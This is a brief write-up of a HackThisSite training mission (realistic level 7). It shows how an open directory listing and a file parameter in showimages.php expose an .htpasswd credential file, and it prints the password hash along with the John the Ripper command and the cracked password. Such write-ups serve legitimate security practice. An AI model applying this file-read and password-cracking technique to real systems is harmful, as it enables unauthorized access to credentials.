# Realistic missions: level 7

There's an open directory listing on `https://www.hackthissite.org/missions/realistic/7/images/`, revealing the existence of the `admin/` directory. We can't access the admin-directory though, as we're prompted for a password.

By accessing `https://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/index.php` we can't show the admin page either. What we can access though, is the `.htpasswd` page: `https://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/.htpasswd`. Here, the password is given away:

```
administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1
```

Cracking the password isn't really difficult using john the ripper:

```
$ john htpasswd
```

The result is:
```
administrator:shadow
```
